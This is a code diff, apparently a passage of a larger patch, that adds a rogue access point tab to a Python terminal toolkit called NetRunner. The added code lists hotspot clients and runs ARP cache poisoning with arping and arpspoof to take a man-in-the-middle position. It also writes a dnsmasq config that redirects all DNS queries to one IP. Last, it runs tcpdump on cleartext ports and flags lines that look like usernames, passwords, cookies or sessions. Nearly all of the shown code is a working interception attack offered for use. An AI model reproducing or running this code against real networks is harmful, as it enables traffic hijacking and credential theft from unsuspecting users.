+            proc = await asyncio.create_subprocess_exec(
+                "ip", "neigh", "show",
+                stdout=asyncio.subprocess.PIPE,
+            )
+            stdout, _ = await proc.communicate()
+
+            clients = []
+            for line in stdout.decode().split('\n'):
+                if '10.42.0.' in line and 'REACHABLE' in line:
+                    parts = line.split()
+                    if len(parts) >= 5:
+                        ip = parts[0]
+                        mac = parts[4] if len(parts) > 4 else "unknown"
+                        vendor = lookup_mac_vendor(mac)
+                        clients.append((ip, mac, vendor))
+
+            if clients:
+                log.write(f"\n{'IP Address':<16} {'MAC Address':<18} {'Vendor':<20}")
+                log.write("-" * 55)
+                for ip, mac, vendor in clients:
+                    log.write(f"[green]{ip:<16} {mac:<18} {vendor:<20}[/green]")
+                log.write(f"\n[cyan]Total clients: {len(clients)}[/cyan]")
+            else:
+                log.write("[yellow]No clients connected yet[/yellow]")
+
+            # Also try to get DHCP leases
+            lease_file = "/var/lib/NetworkManager/dnsmasq-wlan0.leases"
+            try:
+                with open(lease_file, 'r') as f:
+                    leases = f.readlines()
+                    if leases:
+                        log.write("\n[cyan]DHCP Leases:[/cyan]")
+                        for lease in leases:
+                            parts = lease.split()
+                            if len(parts) >= 4:
+                                mac, ip, hostname = parts[1], parts[2], parts[3]
+                                log.write(f"  [green]{ip:<16} {mac:<18} {hostname}[/green]")
+            except FileNotFoundError:
+                pass
+
+            status.update("[green]Client check done[/green]")
+
+        except Exception as e:
+            log.write(f"[red]Error: {e}[/red]")
+            status.update("[red]Failed[/red]")
+
+    @work(exclusive=True)
+    async def run_arp_spoof(self, target: str) -> None:
+        """Start ARP spoofing attack (requires arpspoof or manual implementation)."""
+        log = self.query_one("#ap-results", RichLog)
+        status = self.query_one("#ap-status", Static)
+
+        gateway = get_default_gateway()
+
+        log.write(f"\n[bold magenta]>>> ARP SPOOFING <<<[/bold magenta]")
+        log.write(f"[yellow]Target: {target}[/yellow]")
+        log.write(f"[yellow]Gateway: {gateway}[/yellow]")
+        log.write(f"[cyan]Poisoning ARP caches...[/cyan]\n")
+
+        status.update("[magenta]ARP Spoofing...[/magenta]")
+        self._arp_spoofing = True
+
+        try:
+            # Enable IP forwarding
+            await asyncio.create_subprocess_exec(
+                "sudo", "sysctl", "-w", "net.ipv4.ip_forward=1",
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            log.write("[green]IP forwarding enabled[/green]")
+
+            # Get our MAC and interface
+            iface = self.query_one("#ap-iface", Select).value
+            our_mac_proc = await asyncio.create_subprocess_exec(
+                "ip", "link", "show", iface,
+                stdout=asyncio.subprocess.PIPE,
+            )
+            out, _ = await our_mac_proc.communicate()
+            our_mac_match = re.search(r'link/ether ([0-9a-f:]+)', out.decode())
+            our_mac = our_mac_match.group(1) if our_mac_match else "unknown"
+
+            log.write(f"[cyan]Our MAC: {our_mac}[/cyan]")
+            log.write(f"[cyan]Interface: {iface}[/cyan]")
+
+            # Try using arping/arpspoof if available, otherwise use raw packets
+            # Check if arpspoof exists
+            which_proc = await asyncio.create_subprocess_exec(
+                "which", "arpspoof",
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            await which_proc.communicate()
+
+            if which_proc.returncode == 0:
+                # Use arpspoof
+                log.write("[cyan]Using arpspoof tool...[/cyan]")
+                log.write(f"[yellow]Run in separate terminals:[/yellow]")
+                log.write(f"  sudo arpspoof -i {iface} -t {target} {gateway}")
+                log.write(f"  sudo arpspoof -i {iface} -t {gateway} {target}")
+            else:
+                # Manual ARP poisoning using arping
+                log.write("[cyan]Sending spoofed ARP packets via arping...[/cyan]")
+
+                # Spoof: tell target we are the gateway
+                spoof_cmd1 = ["sudo", "arping", "-c", "3", "-U", "-I", iface, "-s", gateway, target]
+                # Spoof: tell gateway we are the target
+                spoof_cmd2 = ["sudo", "arping", "-c", "3", "-U", "-I", iface, "-s", target, gateway]
+
+                proc1 = await asyncio.create_subprocess_exec(
+                    *spoof_cmd1,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+                proc2 = await asyncio.create_subprocess_exec(
+                    *spoof_cmd2,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+
+                await proc1.communicate()
+                await proc2.communicate()
+
+                log.write("[green]ARP poison packets sent[/green]")
+                log.write("[yellow]Note: For persistent spoofing, install 'dsniff' package[/yellow]")
+                log.write("[yellow]  sudo apt install dsniff[/yellow]")
+
+            log.write(f"\n[green]MITM position established (if target is on same LAN)[/green]")
+            log.write(f"[cyan]Traffic from {target} now routes through us[/cyan]")
+            status.update("[green]ARP Spoof Active[/green]")
+
+            if hasattr(self.app, 'sound_enabled') and self.app.sound_enabled:
+                play_beep(800, 50)
+
+        except Exception as e:
+            log.write(f"[red]Error: {e}[/red]")
+            status.update("[red]ARP Spoof failed[/red]")
+            self._arp_spoofing = False
+
+    def stop_arp_spoof(self) -> None:
+        """Stop ARP spoofing."""
+        log = self.query_one("#ap-results", RichLog)
+        status = self.query_one("#ap-status", Static)
+
+        self._arp_spoofing = False
+        log.write("\n[yellow]ARP spoofing stopped[/yellow]")
+        status.update("[yellow]ARP Spoof stopped[/yellow]")
+
+    @work(exclusive=True)
+    async def run_dns_spoof(self, redirect_ip: str) -> None:
+        """Configure DNS spoofing via dnsmasq."""
+        log = self.query_one("#ap-results", RichLog)
+        status = self.query_one("#ap-status", Static)
+
+        log.write(f"\n[bold magenta]>>> DNS SPOOFING <<<[/bold magenta]")
+        log.write(f"[yellow]Redirecting all DNS queries to: {redirect_ip}[/yellow]\n")
+
+        status.update("[cyan]Configuring DNS spoof...[/cyan]")
+
+        try:
+            # Create dnsmasq override config
+            dns_config = f"""# NetRunner DNS Spoof Config
+address=/#/{redirect_ip}
+log-queries
+log-facility=/tmp/dnsmasq-spoof.log
+"""
+            config_path = "/tmp/netrunner-dns-spoof.conf"
+
+            # Write config
+            proc = await asyncio.create_subprocess_exec(
+                "sudo", "tee", config_path,
+                stdin=asyncio.subprocess.PIPE,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+            await proc.communicate(input=dns_config.encode())
+
+            log.write(f"[green]DNS spoof config written to {config_path}[/green]")
+            log.write(f"[cyan]All DNS queries will resolve to {redirect_ip}[/cyan]")
+            log.write(f"\n[yellow]To activate, run:[/yellow]")
+            log.write(f"  sudo dnsmasq -C {config_path} --no-daemon")
+            log.write(f"\n[yellow]Or add to existing dnsmasq:[/yellow]")
+            log.write(f"  sudo cp {config_path} /etc/dnsmasq.d/")
+            log.write(f"  sudo systemctl restart dnsmasq")
+
+            self._dns_spoofing = True
+            status.update("[green]DNS Spoof configured[/green]")
+
+            if hasattr(self.app, 'sound_enabled') and self.app.sound_enabled:
+                play_beep(1000, 50)
+
+        except Exception as e:
+            log.write(f"[red]Error: {e}[/red]")
+            status.update("[red]DNS Spoof failed[/red]")
+
+    def stop_dns_spoof(self) -> None:
+        """Stop DNS spoofing."""
+        log = self.query_one("#ap-results", RichLog)
+        status = self.query_one("#ap-status", Static)
+
+        self._dns_spoofing = False
+        log.write("\n[yellow]DNS spoofing config disabled[/yellow]")
+        log.write("[cyan]Remove /etc/dnsmasq.d/netrunner-dns-spoof.conf if added[/cyan]")
+        status.update("[yellow]DNS Spoof stopped[/yellow]")
+
+    @work(exclusive=True)
+    async def run_traffic_capture(self) -> None:
+        """Capture traffic from AP clients."""
+        log = self.query_one("#ap-results", RichLog)
+        status = self.query_one("#ap-status", Static)
+
+        iface = self.query_one("#ap-iface", Select).value
+
+        log.write(f"\n[bold cyan]>>> TRAFFIC CAPTURE <<<[/bold cyan]")
+        log.write(f"[cyan]Capturing HTTP/credentials on {iface}...[/cyan]\n")
+
+        status.update("[cyan]Capturing...[/cyan]")
+
+        try:
+            # Capture interesting traffic (HTTP, FTP, Telnet credentials)
+            # Using tcpdump with filters for common credential protocols
+            filter_exp = "port 80 or port 21 or port 23 or port 25 or port 110 or port 143"
+
+            self._capture_proc = await asyncio.create_subprocess_exec(
+                "sudo", "tcpdump", "-i", iface, "-A", "-s", "0", "-c", "100",
+                "-l", filter_exp,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+            )
+
+            captured_count = 0
+            async for line in self._capture_proc.stdout:
+                text = line.decode('utf-8', errors='ignore').rstrip()
+
+                # Look for interesting patterns
+                if any(keyword in text.lower() for keyword in ['user', 'pass', 'login', 'auth', 'cookie', 'session']):
+                    log.write(f"[red][CRED?] {text[:80]}[/red]")
+                    captured_count += 1
+                elif 'HTTP' in text or 'GET ' in text or 'POST ' in text:
+                    log.write(f"[green]{text[:80]}[/green]")
+                elif 'Host:' in text:
+                    log.write(f"[cyan]{text}[/cyan]")
+
+                if captured_count > 50:
+                    break
+
+            await self._capture_proc.wait()
+            log.write(f"\n[yellow]Capture complete[/yellow]")
+            status.update("[green]Capture done[/green]")
+
+        except Exception as e:
+            log.write(f"[red]Error: {e}[/red]")
+            status.update("[red]Capture failed[/red]")
+
+
 class NetRunner(App):
     """NetRunner v3.0 - Cyberpunk Network Toolkit."""
 
@@ -3581,6 +4247,7 @@ class NetRunner(App):
         Binding("0", "tab_security", "Sec", show=True),
         Binding("minus", "tab_bluetooth", "BT", show=True),
         Binding("equal", "tab_packets", "Pkt", show=True),
+        Binding("backslash", "tab_rogueap", "AP", show=True),
         Binding("left", "tab_prev", "←", show=False),
         Binding("right", "tab_next", "→", show=False),
         Binding("up", "focus_prev", "↑", show=False),
@@ -3598,7 +4265,7 @@ class NetRunner(App):
     TAB_ORDER = [
         "tab-scanner", "tab-dns", "tab-wifi", "tab-ping", "tab-speed",
         "tab-monitor", "tab-tools", "tab-geo", "tab-http", "tab-security",
-        "tab-bluetooth", "tab-packets"
+        "tab-bluetooth", "tab-packets", "tab-rogueap"
     ]
 
     def __init__(self):
@@ -3633,6 +4300,8 @@ class NetRunner(App):
                 yield BluetoothModule()
             with TabPane("Packets", id="tab-packets"):
                 yield PacketModule()
+            with TabPane("RogueAP", id="tab-rogueap"):
+                yield RogueAPModule()
         yield Footer()
 
     def on_mount(self) -> None:
@@ -3677,6 +4346,9 @@ class NetRunner(App):
     def action_tab_packets(self) -> None:
         self.query_one("#tabs", TabbedContent).active = "tab-packets"
 
+    def action_tab_rogueap(self) -> None:
+        self.query_one("#tabs", TabbedContent).active = "tab-rogueap"
+
     def action_tab_prev(self) -> None:
         """Navigate to previous tab."""
         tabs = self.query_one("#tabs", TabbedContent)
@@ -3720,6 +4392,7 @@ class NetRunner(App):
             "tab-security": "#sec-results",
             "tab-bluetooth": "#bt-results",
             "tab-packets": "#pkt-results",
+            "tab-rogueap": "#ap-results",
         }
         if active_tab in result_map:
             try:
@@ -3745,6 +4418,7 @@ class NetRunner(App):
             "tab-security": "#sec-results",
             "tab-bluetooth": "#bt-results",
             "tab-packets": "#pkt-results",
+            "tab-rogueap": "#ap-results",
         }
         if active_tab in result_map:
             try:
@@ -3793,6 +4467,7 @@ class NetRunner(App):
             "tab-security": "#sec-results",
             "tab-bluetooth": "#bt-results",
             "tab-packets": "#pkt-results",
+            "tab-rogueap": "#ap-results",
         }
 
         if active_tab in result_map:
